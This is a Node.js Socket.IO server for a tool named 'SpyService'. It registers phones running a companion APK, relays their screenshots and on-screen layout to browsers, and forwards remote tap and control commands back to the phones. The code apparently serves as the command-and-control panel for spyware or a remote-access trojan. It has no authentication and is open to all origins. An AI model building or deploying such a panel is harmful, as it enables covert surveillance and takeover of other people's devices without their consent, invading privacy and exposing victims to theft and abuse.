const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);

// 🔥 PERFECT Socket.IO for SpyService
const io = socketIo(server, {
    cors: { 
        origin: "*", 
        methods: ["GET", "POST"], 
        credentials: true 
    },
    pingTimeout: 60000,
    pingInterval: 25000,
    maxHttpBufferSize: 100 * 1024 * 1024, // 100MB for screenshots
    transports: ['websocket', 'polling']
});

app.use(compression());
app.use(express.static(path.join(__dirname, '.')));
app.use(express.json({ limit: '150mb' }));
app.use(express.urlencoded({ limit: '150mb', extended: true }));

// 🔥 LIVE DEVICES MAP (SpyService format)
const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

// 🔥 MAIN SOCKET CONNECTION
io.on('connection', (socket) => {
    console.log(`🔌 Client connected: ${socket.id} | Total: ${io.engine.clientsCount}`);

    // 🔥 SPYSERVICE SCREEN-FRAME (Hybrid Screenshot + Layout)
    socket.on('screen-frame', (frameData) => {
        try {
            const deviceId = frameData.deviceId;
            if (!devices.has(deviceId)) {
                console.log(`⚠️ Unknown device ${deviceId} sent frame`);
                return;
            }
            
            console.log(`📺 Frame ${deviceId}: ${frameData.width}x${frameData.height} | ${frameData.layout?.length || 0} elements`);
            
            // ✅ BROADCAST TO ALL WEB BROWSERS (phones →→→ browsers)
            socket.broadcast.emit('screen-frame', frameData);
            
        } catch (e) {
            console.error('❌ screen-frame error:', e.message);
        }
    });

    // 🔥 SPYSERVICE LAYOUT UPDATE (Every 2s)
    socket.on('layout-update', (layoutData) => {
        try {
            const deviceId = layoutData.deviceId;
            if (!devices.has(deviceId)) return;
            
            console.log(`🔍 Layout ${deviceId}: ${layoutData.layout.length} elements`);
            socket.broadcast.emit('layout-update', layoutData);
            
        } catch (e) {
            console.error('❌ layout-update error:', e.message);
        }
    });

    // 🔥 SPYSERVICE DEVICE REGISTRATION
    socket.on('register-device', (deviceInfo) => {
        try {
            const deviceId = deviceInfo.deviceId;
            devices.set(deviceId, {
                id: deviceId,
                model: deviceInfo.model,
                brand: deviceInfo.brand,
                version: deviceInfo.version,
                status: deviceInfo.status || 'unknown',
                screen: deviceInfo.screen,
                connected: true,
                socketId: socket.id,
                lastSeen: Date.now()
            });
            
            // ✅ Broadcast to ALL browsers
            socket.broadcast.emit('register-device', deviceInfo);
            io.emit('devices-update', Array.from(devices.values()));
            
            console.log(`✅ 📱 SpyService registered: ${deviceId} (${deviceInfo.model}) | ${devices.size} devices`);
            
        } catch (e) {
            console.error('❌ register-device error:', e.message);
        }
    });

    // 🔥 WEB BROWSER → PHONE CONTROL (Exact SpyService format)
    socket.on('control', (controlData) => {
        try {
            const deviceId = controlData.deviceId;
            console.log(`🎮 CONTROL → ${deviceId}: ${controlData.action} (${controlData.x || ''}, ${controlData.y || ''})`);
            
            // ✅ Forward to target phone ONLY
            socket.broadcast.emit('control', controlData);
            
        } catch (e) {
            console.error('❌ control error:', e.message);
        }
    });

    // 🔥 Browser selects device
    socket.on('select-device', (deviceId) => {
        console.log(`👁️ Browser selected device: ${deviceId}`);
    });

    // 🔥 Stop specific device
    socket.on('stop-device', (deviceId) => {
        console.log(`🛑 Stop requested for: ${deviceId}`);
        if (devices.has(deviceId)) {
            devices.get(deviceId).connected = false;
            io.emit('devices-update', Array.from(devices.values()));
        }
    });

    // 🔥 Cleanup disconnected devices
    socket.on('disconnect', () => {
        console.log(`🔌 Disconnected: ${socket.id}`);
        
        // Mark associated devices offline
        for (let [id, device] of devices) {
            if (device.socketId === socket.id) {
                device.connected = false;
                device.lastSeen = Date.now();
                console.log(`📱 Device ${id} marked offline`);
            }
        }
        
        io.emit('devices-update', Array.from(devices.values()));
    });

    // 🔥 Heartbeat cleanup
    setInterval(() => {
        const now = Date.now();
        for (let [id, device] of devices) {
            if (now - device.lastSeen > 60000) { // 1min timeout
                if (device.connected) {
                    device.connected = false;
                    console.log(`📱 Timeout: ${id}`);
                }
            }
        }
        io.emit('devices-update', Array.from(devices.values()));
    }, 30000);
});

// 🔥 SERVER STATUS
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    const networkIP = require('os').networkInterfaces();
    const localIP = Object.values(networkIP).flat().find(i => 
        i.family === 'IPv4' && !i.internal
    )?.address || 'localhost';
    
    console.log(`\n🚀 SPYSERVICE SERVER LIVE: http://${localIP}:${PORT}`);
    console.log(`📱 SpyService APK → ws://${localIP}:${PORT}`);
    console.log(`🌐 Browser Control → http://${localIP}:${PORT}`);
    console.log(`📊 Devices: ${devices.size} | Serve index.html from same folder`);
    console.log(`\n✅ READY - Screenshot + Layout Spy Mode ACTIVE\n`);
});
